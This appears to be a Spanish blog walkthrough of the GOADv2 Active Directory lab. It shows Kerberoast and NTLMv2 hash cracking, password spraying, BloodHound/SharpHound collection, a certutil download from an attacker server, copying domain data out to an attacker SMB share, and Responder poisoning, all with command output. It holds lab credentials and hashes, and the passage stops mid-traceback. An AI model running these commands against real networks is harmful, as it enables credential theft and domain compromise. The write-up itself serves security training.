       │ 229dd142d48f01c4fc8c18a659d236f424fdd3f1c2708d3fd192ceef9517718945d540650b28cc60ddda7a162a5f74cf2bfb3d9e51d0e5229f0b598f97fd4b2f66d1776254a9dfdf74114e71114e87e2d4c5a5ccb7f6
       │ 41033c7add5357b941274ef064c016fac0c656a1e29eec5244b453b25d98f2919d80b932ffccd3813ac0ff57a4efd91d5bafd9527e731cff085c5c1f6e7ff5c73d32f27c373aa09a166f91e8bd8c5abe7e7af8b532b2
       │ 9192f8abbdc640ced2d61491f9843f60538fa1588a045cb2ff8d938abd58d7f2be507672dcddd66afa798cda53a10dcbc6e2b2e7b2eb7abbdfc191843488bcf3c8b329b7ef590a0035240869d5d9c64f7124d6696646
       │ 1d37dffadda920e7880fd038c80cdaa4232d41411cb4e480fc1e470dd1925f708d521feb5f7e8c658fb29149bc00cb6c4707e4909f365b2d5bb3c60e6683d4627e48106577c44e7cd1f0eac2eb06cb1eefaefc45e3af
       │ b4bedff872a338c70102845b27365532b0863c4d99402fea647d91e9153e0f86ea90214628e0ae43dec7a26435d12773283ccb38c67808cc57f7cdb47156ff6ff3b06c1ee7a9123e0b05f017df4de950c34c6677fc43
       │ ec5104095ce442b9822c6ab
   2   │ $krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql_svc*$914daa72ad7d9c7464c3cd283cba980d$ea86bc3f0b3aee12757f5df2aa6158d1828f0c342cec790c9daad5f67
       │ 3bcbccc7fe6000088f924a306dad790ffda29e09e63525258dd191cb88bf7613376257c3440ee4bb5ca018d0b55e44605545f4337b151b6eeae11008358253861dccb39c103b5a9cdd9c110355cd0fe9cc487ed743d8
       │ b4869b6745e6d8bfae9bb031fd34a97cdd436326db32343ec49e382658e6ea1846c364be68447f5196abe879210fd41740faa63c26a0659ee989b45b15386f6bbab3f98742f088f698813103d78e1f585231f3922f3e
       │ 82f3fdece98dc485136bb49610223d535153633bde56737025c78dc452d7cb8887811e0e374b9dd66ec5afe7113a9ede26bef41b3ba52bc28433280292605ddc881ad1bbacfb0e00635c5318dbf94df0e934db51b584
       │ 4adc896069b89f2f3bd33cbd68074832371f69e40f4735d8bf425ab412dea66217093e15729c0f2e933ef98a7f180d2d5d782f785899a0220789077cd4f6a6de27ac85d646a76d9087664399e8387482765d7fc686b6
       │ 41ca67ffd38f48279eb579a539dee0bba7300b5e3fda96364c34ebd963c98c33d24830f642011ec05907e454ac550543d04330b4edd6db6e557ffb6240aac94a2f25d2ed64e54f5ca6aef0f74c26cc2a5db45816cb7b
       │ 1adc5293f2d52cd9d2162d00ca47b8eb858e97bec8687cbd479f5700e3aaaaf2b7d28cfbfbc1fb942dc1794648ea7d607118a12542357237ff512fe2f0fc59c5e853c2372672b1656f4e4d14d894d1d6fd9ab63b5bd2
       │ c373e0e8bcec31dbb0334a192e3c15c0ff4f58116ba7a3611e2b3ec22e4d13f6dc88d8c18c6959c00cb53e8bfa4d3420f28a6591d480f46b7282d36ed3979e71bb88774f822b8d28a3da9d3e7495c8911c300a29d7bb
       │ 1e5116f949c274ccd75e2be3fda101e6436a6c8bb25b53ec3143f3c8980633c401d3d4417dfb93e24b365a741e69d19201c1b895af1680933d8ca098bffc15726aa98cdb446c4c92ab390293eb0456db1a2ce55231c4
       │ 0f22c8c9e8347b0795d981298a0be14a1d4d5253673a87be839c91bba74e26eefe765ecf13720bea4c30a2b44eb07c875fa5c3010aa2dc68ff33458e925c9bc1590e47c26207244919c2fb5e7fd8ceb61bc0e660cef0
       │ 54eee2aa3309dee2e7d6f83ff907e18c64571286b4acd3e9819f662e9dec2bd59878e1d38c5dfc2178096e361be78cff903097025c94708306acc8504237d6944c13e16f1d0d8bfec5b4a641b97fa4d1f36544d16e95
       │ 35f7376c386cf164a7001c3f4ad34583d653e3d4524b2d0153a70f21f5eceef9588f2781179477cecb6b370f1ca5d95cc0e037d451ecde72bd62c84ff3687d76394f9b273ca45be9e9cfdc59423edb30488c336e241c
       │ 975562da60ba498c7d1469107e959e07e626888645ac06167c2b8a8978a47ea66db49e0603cbc6fde940abd50c21e58906e273ddf9dfacfc63438c7ecce48ef512bc4099b104d0c63af421e376cc9f1944a9056ff849
       │ 8e12500f2dff118b6552c
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

El siguiente paso implica intentar descifrarlo utilizando la herramienta "John the Ripper".

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #john --wordlist='/usr/share/wordlists/rockyou.txt' kerberoasting.hashes 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iknownothing     (?)
1g 0:00:00:14 DONE (2023-07-06 20:32) 0.06752g/s 968518p/s 1470Kc/s 1470KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Se puede confirmar que se han obtenido las credenciales de este usuario.

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cme smb 192.168.56.11 -u sql_svc -p 'iknownothing'
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:iknownothing STATUS_LOGON_FAILURE

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cme smb 192.168.56.11 -u jon.snow -p 'iknownothing'
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing
```

---

# BloodHound

Este lab puede dar un error en los nameservers, al tratarse de algo local, en caso de que nos presente un error, vamos a configurar el archivo /etc/resolv.conf y agregamos la linea nameserver  127.0.0.1

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/12]
└──╼ #cat /etc/resolv.conf 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/resolv.conf
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
   2   │ #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
   3   │ # 127.0.0.53 is the systemd-resolved stub resolver.
   4   │ # run "resolvectl status" to see details about the actual nameservers.
   5   │ 
   6   │ nameserver  127.0.0.1
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

ahora con la herramienta bloodhound-python, que recopila información sobre la estructura de la red, los usuarios, los grupos y las relaciones entre ellos para ayudar a identificar posibles vulnerabilidades y riesgos de seguridad, vamos a extraer esta data, para luego visualizarla en la herramienta bloodhound, tener en cuenta que bloodhound y bloodhound-python  son diferentes, bloodhound-python  nos permite como decimos en este parrafo, extraer la información necesaria, mientras que bloodhound, nos ayuda a graficar estos datos.
Iniciamos con la extración del dominio sevenkingdoms.local conn el comando `bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.10 -d sevenkingdoms.local -dc kingslanding.sevenkingdoms.local`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/10]
└──╼ #bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.10 -d sevenkingdoms.local -dc kingslanding.sevenkingdoms.local
INFO: Found AD domain: sevenkingdoms.local
INFO: Connecting to LDAP server: kingslanding.sevenkingdoms.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: kingslanding.sevenkingdoms.local
INFO: Found 15 users
INFO: Found 58 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: kingslanding.sevenkingdoms.local
INFO: Done in 00M 00S
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/10]
└──╼ #ll
Permissions Size User        Date Modified Name
.rwxrwxrwx  4,1k angussmoody 21 jul 21:43  20230721214312_computers.json
.rwxrwxrwx  3,2k angussmoody 21 jul 21:43  20230721214312_domains.json
.rwxrwxrwx   96k angussmoody 21 jul 21:43  20230721214312_groups.json
.rwxrwxrwx   36k angussmoody 21 jul 21:43  20230721214312_users.json
```

Ahora continuamos con la extraemos la información de north.sevenkingdoms.local con el comando `bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.11 -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/11]
└──╼ #bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.11 -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local 
INFO: Found AD domain: north.sevenkingdoms.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local
INFO: Connecting to GC LDAP server: winterfell.north.sevenkingdoms.local
INFO: Found 16 users
INFO: Found 50 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: castelblack.north.sevenkingdoms.local
INFO: Querying computer: winterfell.north.sevenkingdoms.local
INFO: Done in 00M 01S
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/11]
└──╼ #ll
Permissions Size User        Date Modified Name
.rwxrwxrwx   13k angussmoody 21 jul 21:24  20230721160244_bh_north_sevenkingdoms.zip
.rwxrwxrwx  6,3k angussmoody 21 jul 21:40  20230721214041_computers.json
.rwxrwxrwx  3,1k angussmoody 21 jul 21:40  20230721214041_domains.json
.rwxrwxrwx   82k angussmoody 21 jul 21:40  20230721214041_groups.json
.rwxrwxrwx   39k angussmoody 21 jul 21:40  20230721214041_users.json
```

y terminamos con el dominio essos.local con el comando `bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.12 -d essos.local -dc meereen.essos.local` esta herramienta nos permite realizar la extración de ésta información, pero no cuenta con tantos detalles como otras herramientas, por ejemplo la próxima herramienta que vamos a ver.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/12]
└──╼ #bloodhound-python -c all -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -ns 192.168.56.12 -d essos.local -dc meereen.essos.local
INFO: Found AD domain: essos.local
INFO: Connecting to LDAP server: meereen.essos.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: meereen.essos.local
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: braavos.essos.local
INFO: Querying computer: meereen.essos.local
INFO: Done in 00M 16S
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/12]
└──╼ #ll
Permissions Size User        Date Modified Name
.rwxrwxrwx  5,3k angussmoody 21 jul 21:37  20230721213710_computers.json
.rwxrwxrwx  2,9k angussmoody 21 jul 21:37  20230721213710_domains.json
.rwxrwxrwx   85k angussmoody 21 jul 21:37  20230721213710_groups.json
.rwxrwxrwx   24k angussmoody 21 jul 21:37  20230721213710_users.json
```

Si tenemos un acceso rdp podemos realizar la extración de la data con una herramienta más completa llamada [sharphound](https://github.com/BloodHoundAD/SharpHound/releases){:target="_blank"},  esta herramienta realiza una extración más completa de los datos, para realizar la conexión rdp podemos realizarlo de muchas maneras, en este caso vamos a utilizar la herramienta xfreerdp, para tener un acceso remoto al equipo SRV02 vamos a realizarlo con el comando `xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound]
└──╼ #xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
```

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%206.png)

vamos a abrimos una cmd y nos pasamos el [sharphound](https://github.com/BloodHoundAD/SharpHound/releases) para este caso la versión 1.1.1 tener en cuenta que depende de la versión que utilicemos ésta va a ser compatible con una versión expecifica de [bloodhound](https://github.com/BloodHoundAD/BloodHound){:target="_blank"}, en este caso la herramienta sharphound 1.1.1 es compatible con bloodhound 4.3.1

Creamos un servidor http con python3 es nuestra máquina atacante

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/SharpHound-v1.1.1]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Para este ejemplo, me cree un directorio llamado test en el escritorio del usuario

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%207.png)

con la herramienta certutil.exe de windows, vamos a subir el sharpHound.exe con el comando `certutil.exe -urlcache -split -f http://192.168.56.101/SharpHound.exe SharpHound.exe`

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%208.png)

Una vez subido vamos a extraer la información con los siguientes comando:

```csharp
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip

.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip

.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
```

La extración de esta data puede demorar unos minutos.

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%209.png)

una vez terminamos de ejecutar los comandos, nos queda como resuldatos unos archivos .zip, estos son los archivos que debemos pasar a nuestra máquina atacante para graficarlos en la herramienta bloodhound

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2010.png)

descargarmos estos archivos, para este ejemplo lo vamos a realizar con la herramienta impacket-smbserver, pero se podría realizar de muchas formas, como podemos ver en este árticulo de [ironhackers](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/){:target="_blank"}

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/SharpHound-v1.1.1]
└──╼ #impacket-smbserver -smb2support test .
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

ahora desde la máquina victima vamos pasando archivo por archico con los comandos

```csharp
copy 20230721201127_bh_north_sevenkingdoms.zip \\192.168.56.101\test\20230721201127_bh_north_sevenkingdoms.zip

copy 20230721201610_bh_sevenkingdoms.zip \\192.168.56.101\test\20230721201610_bh_sevenkingdoms.zip

copy 20230721201813_bh_essos.zip \\192.168.56.101\test\20230721201813_bh_essos.zip
```

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2011.png)

Una vez tenemos los archivos debemos correr la herramienta bloodhound, esta herramienta corre en compañía de neo4j, para realizar la configuración de esta, se puede consultar en la [wiki](https://bloodhound.readthedocs.io/en/latest/index.html){:target="_blank"} oficial de bloodhound, tener en cuenta que para la versión 4.3.1 de bloodhound se debe tener una version de neo4j superior a 4.4.0 en este caso yo cuento con la versión 4.4.1 y le cree un alias en la bashrc para realizar el llamado de la herramienta.

Corremos la herramienta con el comando `neo4j console`  en mi caso como dije en el anterior parrafo creé un alias llamado Neo4jcon, para realizarlo de forma  más rápida, una vez la herramienta esté lista nos dará un mensaje de Started

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #Neo4jcon 
Directories in use:
home:         /opt/neo4j
config:       /opt/neo4j/conf
logs:         /opt/neo4j/logs
plugins:      /opt/neo4j/plugins
import:       /opt/neo4j/import
data:         /opt/neo4j/data
certificates: /opt/neo4j/certificates
licenses:     /opt/neo4j/licenses
run:          /opt/neo4j/run
Starting Neo4j.
2023-07-22 22:15:48.318+0000 INFO  Starting...
2023-07-22 22:15:48.934+0000 INFO  This instance is ServerId{2ea5a1e4} (2ea5a1e4-30a6-401d-aa95-6b8e42c7387d)
2023-07-22 22:15:50.296+0000 INFO  ======== Neo4j 4.4.1 ========
2023-07-22 22:15:51.724+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2023-07-22 22:15:51.724+0000 INFO  Updating the initial password in component 'security-users'
2023-07-22 22:15:52.732+0000 INFO  Bolt enabled on localhost:7687.
2023-07-22 22:15:53.526+0000 INFO  Remote interface available at http://localhost:7474/
2023-07-22 22:15:53.529+0000 INFO  id: 64BC5D0C90A7545CB7EADE319CA2E7F7A89AEDE9F30AA6F42AE4F5E2D200EBDD
2023-07-22 22:15:53.529+0000 INFO  name: system
2023-07-22 22:15:53.530+0000 INFO  creationDate: 2023-07-21T23:15:04.757Z
2023-07-22 22:15:53.530+0000 INFO  Started.
```

Una vez esté corriendo neo4j (la primera vez se debe configurar una nueva contraseña, por defecto viene con las credenciales neo4j:neo4j) esta configuracion se realiza en http://localhost:7474/ como nos dice la herramienta, luego de correr el neo4j vamos a correr el bloodhound con el comando `./BloodHound --no-sandbox como nos dice la` [wiki](https://bloodhound.readthedocs.io/en/latest/index.html){:target="_blank"}, para este caso también me cree un alias para realizarlo más cómodamente

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody]
└──╼ #Bloodhoundact 
(node:17056) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:17119) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

Este comando nos abrirá la herramienta que nos pide los datos de incio de sesión, el usuario como se dijo anteriormente es neo4j y la contraseña la que le ponemos la primera vez que corremos el neo4j y nos pide cambio de contraseña.

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2012.png)


una vez iniciamos sesión nos saldrá la herramienta de esta menera, sin datos cargados, debemos dar clic en el bóton Upload Data y subir los archivos .zip descargados anteriormente, para este ejemplo subimos el del dominio sevenkingdoms.local

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2013.png)

Nos mostrará una ventana donde si todo salió bien, nos va mostrando el estado de los archivos que va subiendo, esperamos a que suba todos y así mismo vamos a subir los otros dos archivos que tenemos de la data de los dominitos north.sevenkingdoms.local y essos.local

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2014.png)

Una vez subida toda la data, se puede iniciar a analizar la data que tienen estos dominios

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2015.png)

Mostrar dominios y equipos

```csharp
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
```

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2016.png)

ver el mapa general de dominios/grupos/usuarios

```csharp
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
```

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2017.png)

Ver las ACL de los usuarios, entre otras cosas que veremos más adelante.

```csharp
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2018.png)

---

# Poison and Relay

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2019.png)

vamos a envenenar la red con la herramienta responder, solo debemos correr la herramienta y esperar si llega algunos datos, mientras vamos realizando otros procesos

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound/10]
└──╼ #responder -I ens33
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens33]
    Responder IP               [192.168.56.101]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W6P2KG20IX5]
    Responder Domain Name      [ZWM0.LOCAL]
    Responder DCE-RPC Port     [48850]

[+] Listening for events...
```

Esperando unos minutos vemos unas respuestas en este caso los TGT de los usuarios robb.stark y eddard.stark

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2020.png)

vamos a pasar estos Tickets a un archivo para crackearlos, en este caso los TGT son hash a los que se les puede aplicar fuerza bruta ofline, en este caso lo vamos a pasar en archivos independientes, pero se podrían poner en un mismo archivo con un salto de linea, para realizar el crackeo

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cat hash_robb.stark 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash_robb.stark
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ robb.stark::NORTH:fc8d6b95deba3d54:0C6A5C7A103FAA24A0B0BA8B5344C7DC:01010000000000008045E296C9BCD9019BBFE9A74F00914100000000020008005A0057004D00300001001E
       │ 00570049004E002D0057003600500032004B0047003200300049005800350004003400570049004E002D0057003600500032004B004700320030004900580035002E005A0057004D0030002E00
       │ 4C004F00430041004C00030014005A0057004D0030002E004C004F00430041004C00050014005A0057004D0030002E004C004F00430041004C00070008008045E296C9BCD90106000400020000
       │ 000800300030000000000000000000000000300000004A1FBFC32ABB4E48D8BED8F4CE71B9600B7308C55B451032EB44ACE4D88A8B0A0010000000000000000000000000000000000009001600
       │ 63006900660073002F0042007200610076006F0073000000000000000000
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cat hash_eddard.stark 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash_eddard.stark
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ eddard.stark::NORTH:dac6bf8ab9974e30:E1A5ABAF5AB0D84E7B663B763FA45F85:01010000000000008045E296C9BCD901FADD51DB7788C86700000000020008005A0057004D0030000100
       │ 1E00570049004E002D0057003600500032004B0047003200300049005800350004003400570049004E002D0057003600500032004B004700320030004900580035002E005A0057004D0030002E
       │ 004C004F00430041004C00030014005A0057004D0030002E004C004F00430041004C00050014005A0057004D0030002E004C004F00430041004C00070008008045E296C9BCD901060004000200
       │ 00000800300030000000000000000000000000300000004A1FBFC32ABB4E48D8BED8F4CE71B9600B7308C55B451032EB44ACE4D88A8B0A00100000000000000000000000000000000000090014
       │ 0063006900660073002F004D006500720065006E000000000000000000
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Crackear los hash con john the ripper lo que nos da como resultado la contrasena sexywolfy para el archvio hash_robb.stark, la contraseña de eddard.stark es un poco más dificil, así que no se logra romper con el diccionario rockyou.txt

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #john --wordlist='/usr/share/wordlists/rockyou.txt' hash_robb.stark 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sexywolfy        (robb.stark)
1g 0:00:00:00 DONE (2023-07-22 18:45) 1.086g/s 1412Kp/s 1412Kc/s 1412KC/s shaker21..sexyjavi
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

> Responder guarda los logs en /opt/tools/Responder/logs (en exegol), por si necesita volver a mostrarlos.
> 

> Si desea eliminar los registros capturados anteriormente (mensaje omitido hash capturado anteriormente) eliminar el archivo /opt/tools/Responder/Responder.db
> 

---

# Explotación con Usuarios

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2021.png)

---

## SamAccountName (nopac)

Vamos a ejecutar el comando `cme ldap -L` este comando se utiliza para realizar la enumeración de cuentas de usuario en un dominio LDAP

```csharp
cme ldap -L
[*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
[*] daclread                  Read and backup the Discretionary Access Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be carefull, this module cannot read the DACLS recursively, more explains in the  options.
[*] get-desc-users            Get description of the users. May contained password
[*] get-network               
[*] groupmembership           Query the groups to which a user belongs.
[*] laps                      Retrieves the LAPS passwords
[*] ldap-checker              Checks whether LDAP signing and binding are required and / or enforced
[*] maq                       Retrieves the MachineAccountQuota domain-level attribute
[*] pso                       Query to get PSO from LDAP
[*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc                 Get user descriptions stored in Active Directory
[*] whoami                    Get details of provided user
```

con la opción -M maq revisamos que podamos agregar máquinas, para esto vamos correr el comando `cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq
SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
LDAP        winterfell.north.sevenkingdoms.local 389    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing 
MAQ         winterfell.north.sevenkingdoms.local 389    WINTERFELL       [*] Getting the MachineAccountQuota
MAQ         winterfell.north.sevenkingdoms.local 389    WINTERFELL       MachineAccountQuota: 10
```

si no se tiene [impacket](https://github.com/fortra/impacket){:target="_blank"} se puede clonar con el comando `git clone https://github.com/SecureAuthCorp/impacket myimpacket`

```csharp
┌─[root@angussmoody]─[/opt]
└──╼ #git clone https://github.com/SecureAuthCorp/impacket myimpacket
Clonando en 'myimpacket'...
remote: Enumerating objects: 22881, done.
remote: Counting objects: 100% (4320/4320), done.
remote: Compressing objects: 100% (300/300), done.
remote: Total 22881 (delta 4127), reused 4039 (delta 4020), pack-reused 18561
Recibiendo objetos: 100% (22881/22881), 8.48 MiB | 7.39 MiB/s, listo.
Resolviendo deltas: 100% (17516/17516), listo.
```

Nos pasamos al directorio clonado

```csharp
┌─[root@angussmoody]─[/opt]
└──╼ #cd myimpacket/
```

ahora ejecutamos el comando `git checkout -b mydev`

```csharp
┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #git checkout -b mydev
Cambiado a nueva rama 'mydev'
```

Creamos un entorno virtual  venv para no interferir con el entorno del host e instala el repositorio que acabamos de clonar, si no tenemos el módulo para crear entornos virtuales nos lo instalamos con el comando `pip3 install virtualenv`

```csharp
┌─[✗]─[root@angussmoody]─[/opt/myimpacket]
└──╼ #pip3 install virtualenv
Collecting virtualenv
  Downloading virtualenv-20.24.2-py3-none-any.whl (3.0 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.0/3.0 MB 7.1 MB/s eta 0:00:00
Collecting filelock<4,>=3.12.2
  Downloading filelock-3.12.2-py3-none-any.whl (10 kB)
Collecting distlib<1,>=0.3.7
  Downloading distlib-0.3.7-py2.py3-none-any.whl (468 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 468.9/468.9 kB 10.2 MB/s eta 0:00:00
Collecting platformdirs<4,>=3.9.1
  Downloading platformdirs-3.10.0-py3-none-any.whl (17 kB)
Installing collected packages: distlib, platformdirs, filelock, virtualenv
Successfully installed distlib-0.3.7 filelock-3.12.2 platformdirs-3.10.0 virtualenv-20.24.2
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
--- Logging error ---
Traceback (most recent call last):
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 177, in emit
    self.console.print(renderable, overflow="ignore", crop=False, style=style)
